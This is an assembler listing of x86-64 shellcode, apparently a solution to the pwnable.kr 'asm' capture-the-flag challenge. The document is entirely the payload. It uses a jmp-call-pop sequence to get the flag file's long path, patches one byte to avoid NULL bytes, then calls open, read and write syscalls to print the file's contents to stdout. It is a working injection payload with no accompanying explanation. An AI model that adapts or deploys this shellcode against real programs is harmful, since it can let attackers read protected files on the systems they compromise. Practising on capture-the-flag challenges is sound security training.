     1                                  section .text
     2                                  	global _start
     3                                  
     4                                  
     5                                  
     6                                  _start:
     7 00000000 EB42                    	jmp _push_filename
     8                                    
     9                                  _readfile:
    10                                  	; syscall open file
    11 00000002 5F                      	pop rdi ; pop path value
    12                                  	; NULL byte fix
    13 00000003 80B7E900000041          	xor byte [rdi + 233], 0x41
    14                                    
    15 0000000A 4831C0                  	xor rax, rax
    16 0000000D 0402                    	add al, 2
    17 0000000F 4831F6                  	xor rsi, rsi ; set O_RDONLY flag
    18 00000012 0F05                    	syscall
    19                                    
    20                                  	; syscall read file
    21 00000014 6681ECFF0F              	sub sp, 0xfff
    22 00000019 488D3424                	lea rsi, [rsp]
    23 0000001D 4889C7                  	mov rdi, rax
    24 00000020 4831D2                  	xor rdx, rdx
    25 00000023 66BAFF0F                	mov dx, 0xfff; size to read
    26 00000027 4831C0                  	xor rax, rax
    27 0000002A 0F05                    	syscall
    28                                    
    29                                  	; syscall write to stdout
    30 0000002C 4831FF                  	xor rdi, rdi
    31 0000002F 4080C701                	add dil, 1 ; set stdout fd = 1
    32 00000033 4889C2                  	mov rdx, rax
    33 00000036 4831C0                  	xor rax, rax
    34 00000039 0401                    	add al, 1
    35 0000003B 0F05                    	syscall
    36                                    
    37                                  	; syscall exit
    38 0000003D 4831C0                  	xor rax, rax
    39 00000040 043C                    	add al, 60
    40 00000042 0F05                    	syscall
    41                                    
    42                                  	_push_filename:
    43 00000044 E8B9FFFFFF              	call _readfile
    44 00000049 2E2F746869735F6973-     	path: db "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooo
    44 00000052 5F70776E61626C652E-
    44 0000005B 6B725F666C61675F66-
    44 00000064 696C655F706C656173-
    44 0000006D 655F726561645F7468-
    44 00000076 69735F66696C652E73-
    44 0000007F 6F7272795F7468655F-
    44 00000088 66696C655F6E616D65-
    44 00000091 5F69735F766572795F-
    44 0000009A 6C6F6F6F6F6F6F6F6F-
    44 000000A3 6F6F6F6F6F6F6F6F6F-
    44 000000AC 6F6F6F6F6F6F6F6F6F-
    44 000000B5 6F6F6F6F6F6F6F6F6F-
    44 000000BE 6F6F6F6F6F6F6F6F6F-
    44 000000C7 6F6F6F6F6F6F6F6F6F-
    44 000000D0 6F6F6F6F6F6F6F6F6F-
    44 000000D9 6F6F6F6F6F6F6F6F6F-
    44 000000E2 6F6F6F6F6F30303030-
    44 000000EB 303030303030303030-
    44 000000F4 303030303030303030-
    44 000000FD 3030306F6F6F6F6F6F-
    44 00000106 6F6F6F6F6F6F6F6F6F-
    44 0000010F 6F6F6F6F6F6F6F6F30-
    44 00000118 303030303030303030-
    44 00000121 30306F306F306F306F-
    44 0000012A 306F306F306F6E6741 
